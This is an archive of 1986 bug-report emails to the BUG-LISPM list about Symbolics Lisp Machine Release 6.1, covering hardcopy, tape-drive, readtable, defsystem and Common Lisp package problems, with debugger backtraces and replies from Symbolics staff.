When I try to hardcopy to Tremont via MC, the hardcopy process goes
into the debugger.  Apparently it sends the printer object a :HOST
message, which returns NIL.  It then tries to do
INVOKE-SERVICE-ON-HOST upon NIL, with service :HARDCOPY.

I tried locally editing the printer object tremont-via-mc, setting its
host attribute to MIT-MC.  Hardcopy then gave the error that MC does
not support HARDCOPY service.

Hardcopy worked fine in 6.0 (after a patch regarding fonts) -- what can
I do to make it work in 6.1?

Thanks for your assistance.
					--- Ken
-------
28-Feb-86 15:35:47-EST,1253;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 28 Feb 86 15:35-EST
Received: from OTIS.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 24384; Fri 28-Feb-86 15:38:09-EST
Date: Fri, 28 Feb 86 15:34 EST
From: Chris Lindblad <CJL@OZ.AI.MIT.EDU>
Subject: Hardcopy broken yet again.
To: KT@MIT-XX.ARPA
cc: bug-lispm@OZ.AI.MIT.EDU
In-Reply-To: <12187030661.52.KT@XX.LCS.MIT.EDU>
Message-ID: <860228153405.1.CJL@OTIS.AI.MIT.EDU>

    Date: Fri 28 Feb 86 14:58:51-EST
    From: Ken Traub <KT@XX.LCS.MIT.EDU>

    Well, another release has come out, and hardcopy is broken again.
    When I try to hardcopy to Tremont via MC, the hardcopy process goes
    into the debugger.  Apparently it sends the printer object a :HOST
    message, which returns NIL.  It then tries to do
    INVOKE-SERVICE-ON-HOST upon NIL, with service :HARDCOPY.

    I tried locally editing the printer object tremont-via-mc, setting its
    host attribute to MIT-MC.  Hardcopy then gave the error that MC does
    not support HARDCOPY service.

    Hardcopy worked fine in 6.0 (after a patch regarding fonts) -- what can
    I do to make it work in 6.1?

    Thanks for your assistance.

Fixed. Reboot your machine and try again.
 3-Mar-86 08:12:15-EST,1042;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 3 Mar 86 08:12-EST
Received: from MIT-MORRISON.ARPA by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 24563; Mon 3-Mar-86 08:17:35-EST
Date: Mon, 3 Mar 86 08:13 EST
From: JCMA@MIT-AI.ARPA
Subject: NFEP Tape Lossage When Writting FEP Files To Tape
To: bug-lispm@OZ.AI.MIT.EDU
cc: AI.Duffy@UTEXAS-20.ARPA, DCP@SCRC-STONY-BROOK.ARPA
Message-ID: <860303081301.5.JCMA@MIT-MORRISON.ARPA>

Philippe Brou informs me that the new FEP we are running on AI Lab machines
loses when writing fep files to tape (e.g., SID).  What is the story on this?
What is the recommended procedure?  

But 3600 tape technology is also broken.  Give me a break. [Now if I only had
an IBM PC emulator, ....]

It would help if these major losses were announced (better, fixed forthwith)
because some people have systems that require shipping world loads around.
Broken products like this screw up research royally, especially when
publication deadlines are involved as in the present case.
 3-Mar-86 13:52:03-EST,2159;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 3 Mar 86 13:52-EST
Date: Mon,  3 Mar 86 13:51:59 EST
From: Jonathan A Rees <JAR@MC.LCS.MIT.EDU>
Subject:  read table
To: MOON@MC.LCS.MIT.EDU, BUG-LISPM@MC.LCS.MIT.EDU
In-reply-to: Msg of Fri 28 Feb 1986  21:34 EST from Scott E. Fahlman <Fahlman at C.CS.CMU.EDU>
Message-ID: <[MC.LCS.MIT.EDU].836854.860303.JAR>

How do I establish an alternative read table for COMPILE-FILE and LOAD
(of a source file) to pay attention to?  Binding *READTABLE* doesn't
work.  Is this documented somewhere?

It would be nice if in Symbolics Common Lisp I could do this in a
portable way, e.g. if COMPILE-FILE and LOAD looked at the current
binding of *READTABLE*.

2nd question: how do I establish an alternative readtable for ZWEI/ZMACS
to use?  The -*- Syntax:... -*- will only set the redtable to the
zetalisp or common lisp readtable.  I looked carefully at the
documentation of file attribute lists and couldn't find any mention of
any way to do this, and I couldn't find a Set Readtable editor command.

Thanks
- Jonathan

    Date: Fri, 28 Feb 1986  21:34 EST
    From: Scott E. Fahlman <Fahlman at C.CS.CMU.EDU>
    Sender: FAHLMAN at C.CS.CMU.EDU
    To:   Jonathan A Rees <JAR at MC.LCS.MIT.EDU>
    cc:   common-lisp at SU-AI.ARPA
    Re:   Collecting proposals for packages, readtables, etc.
    Message-ID: <FAHLMAN.12187102599.BABYL@C.CS.CMU.EDU>
    In-reply-to: Msg of 28 Feb 1986  13:07-EST from Jonathan A Rees <JAR at MC.LCS.MIT.EDU>

	[From: JAR]
        I simply want to be able to set the
        readtable (and package) with which a *source* file will be *read* by
        COMPILE-FILE and LOAD.

    Pending a resolution of these heavy issues, I would say that in a Lisp
    where Compile-File and/or Load uses the current package and readtable,
    there's no problem in rebinding this before doing the call.  Any Lisp in
    which Compile-File and/or Load insist on binding the package to some
    particular value should allow this to be over-ridden, presumably by a
    :package keyword argument.  Moon says that Symbolics has this already.

 3-Mar-86 15:44:34-EST,2790;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 3 Mar 86 15:44-EST
Received: from ALLEGHENY.SCRC.Symbolics.COM by MC.LCS.MIT.EDU  3 Mar 86 15:44:02 EST
Received: from EUPHRATES.SCRC.Symbolics.COM by ALLEGHENY.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 2031; Mon 3-Mar-86 15:43:25-EST
Date: Mon, 3 Mar 86 15:42 EST
From: David A. Moon <Moon@SCRC-STONY-BROOK.ARPA>
Subject: read table
To: Jonathan A Rees <JAR@MC.LCS.MIT.EDU>
cc: BUG-LISPM@MC.LCS.MIT.EDU
In-Reply-To: <[MC.LCS.MIT.EDU].836854.860303.JAR>
Message-ID: <860303154234.9.MOON@EUPHRATES.SCRC.Symbolics.COM>

    Date: Mon,  3 Mar 86 13:51:59 EST
    From: Jonathan A Rees <JAR@MC.LCS.MIT.EDU>

    How do I establish an alternative read table for COMPILE-FILE and LOAD
    (of a source file) to pay attention to?  Binding *READTABLE* doesn't
    work.  Is this documented somewhere?

    It would be nice if in Symbolics Common Lisp I could do this in a
    portable way, e.g. if COMPILE-FILE and LOAD looked at the current
    binding of *READTABLE*.

The problem is that in the absence of a -*- line, they have to heuristicate
whether your file is a Zetalisp file or a Common Lisp file.  This is a pretty
insurmountable difficulty, when both the Zetalisp users and the Common Lisp
users think compatibility with their language by default is the only sensible
behavior.  I don't know which side of this question Release 6 came down on.

It's hard to say whether COMPILE-FILE using the current binding of *READTABLE*
would be portable or not, since we know from the recent discussion on the
Common Lisp mailing list that Common Lisp doesn't specify hardly anything about
what COMPILE-FILE means or is supposed to do.

    2nd question: how do I establish an alternative readtable for ZWEI/ZMACS
    to use?  The -*- Syntax:... -*- will only set the redtable to the
    zetalisp or common lisp readtable.  I looked carefully at the
    documentation of file attribute lists and couldn't find any mention of
    any way to do this, and I couldn't find a Set Readtable editor command.

I don't know the answers to any of these questions in Release 6.  Contact
Software Support, the people who are supposed to know about these things.

These things will work differently in the next release, but I don't know the
answer there since I'm not one of the people working on this aspect of the
system.  I could probably find out the answers.  I do know that just setting
the readtable won't customize Zwei to know about your private syntax, e.g.
to treat { } like ( ).  Zwei's Lisp parsing is currently not driven by the
readtable, but by a separate mechanism that is more language-independent.
I don't think the way to tell Zwei about things like that is documented yet.

 3-Mar-86 18:51:50-EST,713;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 3 Mar 86 18:51-EST
Received: from ALLEGHENY.SCRC.Symbolics.COM by MC.LCS.MIT.EDU  3 Mar 86 18:50:54 EST
Received: from NEPONSET.SCRC.Symbolics.COM by ALLEGHENY.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 2097; Mon 3-Mar-86 18:50:15-EST
Date: Mon, 3 Mar 86 18:49 EST
From: DCP@SCRC-QUABBIN.ARPA
To: bug-lispm@OZ.AI.MIT.EDU, DCP@SCRC-STONY-BROOK.ARPA
Subject: NFEP Tape Lossage When Writting FEP Files To Tape
References: <860303081301.5.JCMA@MIT-MORRISON.ARPA>
Message-ID: <860303184944.2.DCP@NEPONSET.SCRC.Symbolics.COM>

[The referenced message has been redirected:
    bug-lispm, dcp have been removed;
    HOSS@S has been added.]

 4-Mar-86 10:47:40-EST,845;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 4 Mar 86 10:47-EST
Received: from REAGAN.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 4 MAR 86  10:47:51 EST
Received: from RIEMANN.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 24733; Tue 4-Mar-86 10:47:37-EST
Date: Tue, 4 Mar 86 10:47 EST
From: Roger Hurwitz <rhhu@MIT-REAGAN.ARPA>
Subject: riemann out of focus
To: BUG-LISPM@MIT-REAGAN.ARPA
Message-ID: <860304104716.1.RHHU@RIEMANN.AI.MIT.EDU>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
AISite 13.4, Macsyma 310.35, Experimental RELATUS 147.14,
microcode TMC5-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine Georg Friedrich Bernhard Riemann:

quite blurred monitor needs immediate alignment -
 4-Mar-86 14:30:49-EST,755;000000000000
Received: from SID.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 4 Mar 86 14:30-EST
Date: Tue, 4 Mar 86 14:31 EST
From: David Chapman <Zvona@OZ.AI.MIT.EDU>
Subject: prog labels should go into fefs
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860304143107.2.ZVONA@SID.AI.MIT.EDU>

In Symbolics 3670 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.10,
AISite 13.4, Macsyma 310.35, microcode TMC5-IO4-MIC 336, FEP 127,
FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Sid Vicious:

Dissassembling a fef should tell you where the prog labels are. 

(Yes, there are times when it is reasonable to use prog.  One time is
when you can't depend on the compiler to compile lambda correctly.)
 7-Mar-86 12:52:21-EST,5010;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 7 Mar 86 12:51-EST
Received: from POINCARE.AI.MIT.EDU by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 25056; Fri 7-Mar-86 08:58:21-EST
Date: Fri, 7 Mar 86 08:56 EST
From: John C. Mallery <JCMA@MIT-AI.ARPA>
Subject: Tape drive losing on Poincare
To: BUG-LISPM@OZ.AI.MIT.EDU, bug-hardware@OZ.AI.MIT.EDU
Message-ID: <860307085655.1.JCMA@POINCARE.AI.MIT.EDU>

In Symbolics 3670 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.11,
AISite 13.4, Macsyma 310.35, COLOR 135.50, COLOR-EXTENSIONS 4.6,
COLOR-DEMO 68.7, COLOR-EDITOR 4.1, COLOR-PALETTE 2.1, IMAGES 56.21,
MENU 6.1, microcode TMC5-IO4-FPA-COLOR-MIC 336, FEP 127,
FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Jules Henri Poincare:



>>Error: Hard tape error: FEP/Command error: 40_16. (Accept timeout)
While in the function (:METHOD TAPE:CART-TAPE-STREAM-MIXIN :COMMAND)  (:METHOD TAPE:CART-TAPE-STREAM-MIXIN :AFTER :INIT)  (:INTERNAL (:METHOD TAPE:CART-OUTPUT-STREAM :COMBINED :INIT) 0)

(:METHOD TAPE:CART-TAPE-STREAM-MIXIN :COMMAND):  (P.C. = 33)
   Arg 0 (SELF): #<CART-OUTPUT-STREAM 24245433>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TAPE:CART-TAPE-STREAM-MIXIN -- 17. IV's, 0. FL's 171075351>
   Arg 2 (SI:OPERATION): :COMMAND
   Arg 3 (TAPE:CODE): 1
   --Defaulted args:--
   Arg 4 (TAPE:IGNORE-ERROR): NIL

(:METHOD TAPE:CART-TAPE-STREAM-MIXIN :AFTER :INIT):  (P.C. = 254)
   Arg 0 (SELF): #<CART-OUTPUT-STREAM 24245433>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TAPE:CART-TAPE-STREAM-MIXIN -- 17. IV's, 0. FL's 171075351>
   Arg 2 (SI:OPERATION): :INIT
   Rest arg (IGNORE): (#<DTP-LOCATIVE 500310>)

(:INTERNAL (:METHOD TAPE:CART-OUTPUT-STREAM :COMBINED :INIT) 0):  (P.C. = 12)
   Arg 0 (SELF): #<CART-OUTPUT-STREAM 24245433>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TAPE:CART-OUTPUT-STREAM -- 0. IV's, 6. FL's 171075331>
   Arg 2 (SI:.OPERATION.): :INIT
   Rest arg (SI:.DAEMON-CALLER-ARGS.): (#<DTP-LOCATIVE 500310>)

(:METHOD TAPE:CART-TAPE-STREAM-MIXIN :WHOPPER :INIT):  (P.C. = 52)
   Arg 0 (SELF): #<CART-OUTPUT-STREAM 24245433>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TAPE:CART-TAPE-STREAM-MIXIN -- 17. IV's, 0. FL's 171075351>
   Arg 2 (SI:.WHOPPER-CONTINUATION.): #<DTP-COMPILED-FUNCTION (:INTERNAL (:METHOD TAPE:CART-OUTPUT-STREAM :COMBINED :INIT) 0) 67033247>
   Arg 3 (SI:.OLD-SELF-MAPPING-TABLE.): #<Map to flavor TAPE:CART-OUTPUT-STREAM -- 0. IV's, 6. FL's 171075331>
   Arg 4 (SI:.OPERATION.): :INIT
   Rest arg (ARGS): (#<DTP-LOCATIVE 500310>)

(:METHOD TAPE:CART-OUTPUT-STREAM :COMBINED :INIT):  (P.C. = 13)
   Arg 0 (SELF): #<CART-OUTPUT-STREAM 24245433>
   Arg 1 (SYS:SELF-MAPPING-TABLE): #<Map to flavor TAPE:CART-OUTPUT-STREAM -- 0. IV's, 6. FL's 171075331>
   Arg 2 (SI:.OPERATION.): :INIT
   Rest arg (SI:.DAEMON-CALLER-ARGS.): (#<DTP-LOCATIVE 500310>)

INSTANTIATE-FLAVOR:  (P.C. = 445)
   Arg 0 (SI:FLAVOR-NAME): TAPE:CART-OUTPUT-STREAM
   Arg 1 (SI:INIT-PLIST): #<DTP-LOCATIVE 500310>
   Arg 2 (SI:SEND-INIT-MESSAGE-P): :MAYBE
   --Defaulted args:--
   Arg 3 (SI:RETURN-UNHANDLED-KEYWORDS-P): NIL
   Arg 4 (SI:AREA-TO-CONS-INSTANCE-IN): NIL

MAKE-INSTANCE:  (P.C. = 6)
   Arg 0 (SI:FLAVOR-NAME): TAPE:CART-OUTPUT-STREAM
   Rest arg (SI:INIT-OPTIONS): (:DIRECTION :OUTPUT :REEL NIL :LOCK-REASON "local machine" :NUMBER-OF-BUFFERS NIL)

TAPE:MAKE-CART-TAPE-STREAM:  (P.C. = 37)
   Rest arg (ARGS): (:DIRECTION :OUTPUT :REEL NIL :LOCK-REASON "local machine" :NUMBER-OF-BUFFERS NIL)

TAPE:MAKE-STREAM:  (P.C. = 532)
   Rest arg: (:DIRECTION :OUTPUT :UNIT "CART" :HOST #<LISPM-HOST POINCARE 43310207>)

TAPE:FEP-TAPE-GET-OUTPUT-STREAM:  (P.C. = 32)
   --Defaulted args:--
   Arg 0 (TAPE:HOST): #<LISPM-HOST POINCARE 43310207>

TAPE:WRITE-FEP-FILES-TO-TAPE:  (P.C. = 12)
   --Defaulted args:--
   Arg 0 (TAPE:MIC-NAME): NIL

SI:*EVAL:  (P.C. = 401)
   Arg 0 (SI:FORM): (TAPE:WRITE-FEP-FILES-TO-TAPE)
   Local 0 (SI:FORM): NIL
   --Defaulted args:--
   Arg 1 (SI:ENV): NIL
   Arg 2 (SI:HOOK): NIL

(:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0):  (P.C. = 152)
   Arg 0 (COMPILER:.LEXICAL-ENVIRONMENT-POINTER.): #<DTP-LOCATIVE 500047>

TV:WITH-NOTIFICATION-MODE-INTERNAL:  (P.C. = 16)
   Arg 0 (TV:NEW-MODE): :BLAST
   Arg 1 (TV:STREAM): #:TERMINAL-IO-SYN-STREAM
   Arg 2 (TV:CONTINUATION): #<LEXICAL-CLOSURE (:INTERNAL SI:LISP-COMMAND-LOOP-INTERNAL 0) 500054>

SI:LISP-COMMAND-LOOP-INTERNAL:  (P.C. = 54)
   Arg 0 (SI:NAME): "Lisp Top Level"
   Arg 1 (SI:ABORT-FUNCTION): NIL
   Arg 2 (SI:READ-FUNCTION): NIL
   Arg 3 (SI:EVAL-FUNCTION): NIL
   Arg 4 (SI:PRINT-FUNCTION): NIL

SI:LISP-COMMAND-LOOP:  (P.C. = 67)
   Arg 0: #<LISP-LISTENER Lisp Listener 1 43200064 exposed>
   Rest arg: (:NAME "Lisp Top Level")

SI:LISP-TOP-LEVEL1:  (P.C. = 5)
   Arg 0 (SI:STREAM): #<LISP-LISTENER Lisp Listener 1 43200064 exposed>

SI:LISP-TOP-LEVEL:  (P.C. = 7)
 7-Mar-86 14:35:54-EST,1005;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 7 Mar 86 14:35-EST
Received: from REAGAN.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 7 MAR 86  14:34:14 EST
Received: from MIT-MORRISON.ARPA by MIT-REAGAN.ARPA via CHAOS with CHAOS-MAIL id 25104; Fri 7-Mar-86 14:35:16-EST
Date: Fri, 7 Mar 86 14:33 EST
From: JCMA@MIT-AI.ARPA
Subject: Defsystem Component Systems
To: BUG-LISPM@MIT-REAGAN.ARPA
Message-ID: <860307143350.4.JCMA@MIT-MORRISON.ARPA>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.11,
AISite 13.4, Macsyma 310.35, Experimental RELATUS 147.21,
microcode TMC5-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-info.flod(2),
FEP0:>v127-debug.flod(1), on Lisp Machine Jim Morrison:

are a real crock.  Component systems should be just another kind of module so
I can do transformations on them, e.g. compile them, and specify dependencies,
e.g. other modules that should not be compiled until after component systems
loaded.
 7-Mar-86 16:58:42-EST,1526;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 7 Mar 86 16:58-EST
Received: from REAGAN.AI.MIT.EDU by MC.LCS.MIT.EDU via Chaosnet; 7 MAR 86  16:57:19 EST
Received: from ALLEGHENY.SCRC.Symbolics.COM ([192.10.41.45]) by MIT-REAGAN.ARPA via INTERNET with SMTP id 25122; 7 Mar 86 16:58:21-EST
Received: from THAMES.SCRC.Symbolics.COM by ALLEGHENY.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 3259; Fri 7-Mar-86 16:56:35-EST
Date: Fri, 7 Mar 86 16:56 EST
From: Scott McKay <SWM@SCRC-QUABBIN.ARPA>
Subject: Defsystem Component Systems
To: JCMA@MIT-AI.ARPA, BUG-LISPM@MIT-REAGAN.ARPA
cc: NSS-Designers@SCRC-QUABBIN.ARPA
In-Reply-To: <860307143350.4.JCMA@MIT-MORRISON.ARPA>
Message-ID: <860307165630.5.SWM@THAMES.SCRC.Symbolics.COM>

    Date: Fri, 7 Mar 86 14:33 EST
    From: JCMA@MIT-AI.ARPA

    In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.11,
    AISite 13.4, Macsyma 310.35, Experimental RELATUS 147.21,
    microcode TMC5-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
    FEP0:>v127-loaders.flod(2), FEP0:>v127-info.flod(2),
    FEP0:>v127-debug.flod(1), on Lisp Machine Jim Morrison:

    are a real crock.  Component systems should be just another kind of module so
    I can do transformations on them, e.g. compile them, and specify dependencies,
    e.g. other modules that should not be compiled until after component systems
    loaded.

Boy, have I been waiting to say this...

"Fixed in the new System Construction Tool", available in a Release 7
near you.

 9-Mar-86 16:07:48-EST,553;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 9 Mar 86 16:07-EST
Received: from SNOWBIRD.LCS.MIT.EDU by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 26842; Sun 9-Mar-86 16:06:57-EST
Date: Sun, 9 Mar 86 16:06 EST
From: Carl W. Hoffman <CWH@MIT-ZERMATT.ARPA>
Subject: CL:COPY-SEQ
To: BUG-LISPM@MIT-ZERMATT.ARPA
Message-ID: <860309160647.3.CWH@SNOWBIRD.LCS.MIT.EDU>

In Release 6.1, COPY-SEQ of an ART-Q-LIST array gives me back an ART-Q array.
I want an ART-Q-LIST array back, unless I say otherwise, which I guess I can't.
10-Mar-86 10:31:48-EST,2753;000000000000
Received: from APIARY-7.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 10 Mar 86 10:31-EST
Date: Mon, 10 Mar 86 10:30 EST
From: Sue Felshin <sylph@OZ.AI.MIT.EDU>
Subject: bug in common lisp function require
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860310103021.1.FELSHIN@APIARY-7.AI.MIT.EDU>


The relevant parts of the top of the file look like this:

================

;;; -*- Mode: LISP; Syntax: Common-Lisp; Package: LINGO -*-

(in-package 'lingo
	    ;; Should happen automatically but Symbolics is still
	    ;; mired down in Zetalisp.
	    #+symbolics :use #+symbolics '(common-lisp-user))

(require #-symbolics "bstring" #+symbolics 'bstring)
(use-package "bstring")

================

I tried doing the require with 'bstring, cl:"bstring", cl:"BSTRING", and
(zl:string "bstring").  None of these worked.  In all cases, the module
name was converted to a cl string, and then an error occurred because
the module name wasn't a zl string.  I specifically want to use the
lowercase string so that the symbol interned in the current package
(LINGO) is |bstring|.  Otherwise, I would get package conflicts between
lingo::bstring and bstring:bstring.

Also, I couldn't find any documentation on defining a search path for
modules other than a paragraph implying that all modules had to be in
the site directory (= home directory? or = directory file currently
loading is in?).

================

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.11,
AISite 13.4, Macsyma 310.35, microcode TMC5-MIC 336, FEP 127,
FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Apiary-7:



>>Trap: The first argument given to the ZETALISP-SYSTEM:LDB-INTERNAL instruction, #\B, was not a number.
While in the function ZL:STRING-UPCASE  SI:MAYBE-RELOAD-SYSTEM-DECLARATION  SI:FIND-SYSTEM-NAMED

ZL:STRING-UPCASE:  (P.C. = 26)
   Arg 0 (ZL:STRING): "BSTRING"
   Local 0 (ZL:STRING): "BSTRING"
   --Defaulted args:--
   Arg 1 (SI:FROM): 0
   Arg 2 (SI:TO): NIL
   Arg 3 (SI:COPY-P): T
   Local 4 (SI:LEN): 7
   Local 5 (SI:CHAR): #\B
   Local 6 (SI:SUBCHAR): NIL
   Local 7 (SI:I): 0

SI:MAYBE-RELOAD-SYSTEM-DECLARATION:  (P.C. = 44)
   Arg 0 (SI:SYSTEM-NAME): "BSTRING"
   Arg 1 (SI:KEYWORDS): (:NOCONFIRM)

SI:FIND-SYSTEM-NAMED:  (P.C. = 50)
   Arg 0 (SI:NAME): "BSTRING"
   --Defaulted args:--
   Arg 1 (SI:NO-ERROR-P): NIL
   Arg 2 (SI:LOADED-ONLY): NIL

MAKE-SYSTEM:  (P.C. = 6)
   Arg 0 (SI:SYSTEM): "BSTRING"
   Rest arg (SI:KEYWORDS): (:NOCONFIRM)

REQUIRE:  (P.C. = 17)
   Arg 0 (SCL::MODULE-NAME): LINGO::BSTRING
   Local 0 (SCL::MODULE-NAME): "BSTRING"
   --Defaulted args:--
   Arg 1 (PATHNAME): NIL

10-Mar-86 12:32:21-EST,3979;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 10 Mar 86 12:31-EST
Received: from ALLEGHENY.SCRC.Symbolics.COM by MC.LCS.MIT.EDU 10 Mar 86 12:26:49 EST
Received: from NEPONSET.SCRC.Symbolics.COM by ALLEGHENY.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 3595; Mon 10-Mar-86 12:25:28-EST
Date: Mon, 10 Mar 86 12:25 EST
From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>
Subject: bug in common lisp function require
To: Sue Felshin <sylph@OZ.AI.MIT.EDU>, BUG-LISPM@OZ.AI.MIT.EDU
In-Reply-To: <860310103021.1.FELSHIN@APIARY-7.AI.MIT.EDU>
Message-ID: <860310122545.3.DCP@NEPONSET.SCRC.Symbolics.COM>

    Date: Mon, 10 Mar 86 10:30 EST
    From: Sue Felshin <sylph@OZ.AI.MIT.EDU>

[Please use the standard bug-header.  I assume you are using Release 6
since Release 5 didn't have CLCP by default and Release 7 isn't out
yet.]

    The relevant parts of the top of the file look like this:

    ================

    ;;; -*- Mode: LISP; Syntax: Common-Lisp; Package: LINGO -*-

    (in-package 'lingo
		;; Should happen automatically but Symbolics is still
		;; mired down in Zetalisp.
I don't understand this comment.
		#+symbolics :use #+symbolics '(common-lisp-user))

You should never use the USER package.  Maybe you want to use the
Symbolics-Common-Lisp package.  Note that as soon as you do that, you
are no longer writing portable code, so you don't even need the
#+Symbolics.

    (require #-symbolics "bstring" #+symbolics 'bstring)
    (use-package "bstring")

    ================

    I tried doing the require with 'bstring, cl:"bstring", cl:"BSTRING", and
    (zl:string "bstring").  None of these worked.  In all cases, the module
    name was converted to a cl string, and then an error occurred because
    the module name wasn't a zl string.  
Fixed in Release 7 when there is one type of string.
    I specifically want to use the
    lowercase string so that the symbol interned in the current package
    (LINGO) is |bstring|.  Otherwise, I would get package conflicts between
    lingo::bstring and bstring:bstring.
Depending on things like this probably a very bad idea.

    Also, I couldn't find any documentation on defining a search path for
    modules other than a paragraph implying that all modules had to be in
    the site directory (= home directory? or = directory file currently
    loading is in?).

    ================

    In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.11,
    AISite 13.4, Macsyma 310.35, microcode TMC5-MIC 336, FEP 127,
    FEP0:>v127-lisp.flod(2), FEP0:>v127-loaders.flod(2),
    FEP0:>v127-debug.flod(1), FEP0:>v127-info.flod(2), on Lisp Machine Apiary-7:

[Sigh.  By convention, this bug herald is kept at the top and your
comments go where this text is.]

    >>Trap: The first argument given to the ZETALISP-SYSTEM:LDB-INTERNAL instruction, #\B, was not a number.
    While in the function ZL:STRING-UPCASE  SI:MAYBE-RELOAD-SYSTEM-DECLARATION  SI:FIND-SYSTEM-NAMED

    ZL:STRING-UPCASE:  (P.C. = 26)
       Arg 0 (ZL:STRING): "BSTRING"
       Local 0 (ZL:STRING): "BSTRING"
       --Defaulted args:--
       Arg 1 (SI:FROM): 0
       Arg 2 (SI:TO): NIL
       Arg 3 (SI:COPY-P): T
       Local 4 (SI:LEN): 7
       Local 5 (SI:CHAR): #\B
       Local 6 (SI:SUBCHAR): NIL
       Local 7 (SI:I): 0

    SI:MAYBE-RELOAD-SYSTEM-DECLARATION:  (P.C. = 44)
       Arg 0 (SI:SYSTEM-NAME): "BSTRING"
       Arg 1 (SI:KEYWORDS): (:NOCONFIRM)

    SI:FIND-SYSTEM-NAMED:  (P.C. = 50)
       Arg 0 (SI:NAME): "BSTRING"
       --Defaulted args:--
       Arg 1 (SI:NO-ERROR-P): NIL
       Arg 2 (SI:LOADED-ONLY): NIL

    MAKE-SYSTEM:  (P.C. = 6)
       Arg 0 (SI:SYSTEM): "BSTRING"
       Rest arg (SI:KEYWORDS): (:NOCONFIRM)

    REQUIRE:  (P.C. = 17)
       Arg 0 (SCL::MODULE-NAME): LINGO::BSTRING
       Local 0 (SCL::MODULE-NAME): "BSTRING"
       --Defaulted args:--
       Arg 1 (PATHNAME): NIL


11-Mar-86 10:24:27-EST,5907;000000000000
Received: from APIARY-8.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 11 Mar 86 10:24-EST
Date: Tue, 11 Mar 86 10:23 EST
From: Sue Felshin <sylph@OZ.AI.MIT.EDU>
Subject: common lisp package bug
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860311102320.1.FELSHIN@APIARY-8.AI.MIT.EDU>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.11,
AISite 14.1, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine Apiary-8:

The error occurred while loading the file bitstring, which has the
following header:

;;; -*- Mode: LISP; Syntax: Common-lisp -*-

(provide 'bitstring)

(in-package 'bitstring #+symbolics :use #+symbolics '(common-lisp-global))

(export '(bstring bstringp make-bstring bsref
	  bs-and bs-ior bs-xor bs-eqv bs-nand bs-nor
          bs-andc1 bs-andc2 bs-orc1 bs-orc2
	  bs-all-zerop bs-all-onep bs-any-onep bs-any-zerop
	  bs-equal bs-copy bs-print))

The file was evaluated first (no problems) and then compiled; then I
booted and tried loading it via the following file:

;;; -*- Mode: LISP; Syntax: Common-Lisp -*-

(in-package 'lingo
	    ;; Should happen automatically but Symbolics is still
	    ;; mired down in Zetalisp.
	    #+symbolics :use #+symbolics '(common-lisp-global))

(export '(transform-word unknown-word *lingo-pathname-defaults*))

(require 'bitstring #+symbolics "<sylph.lingo>bitstring")
(use-package 'bitstring)

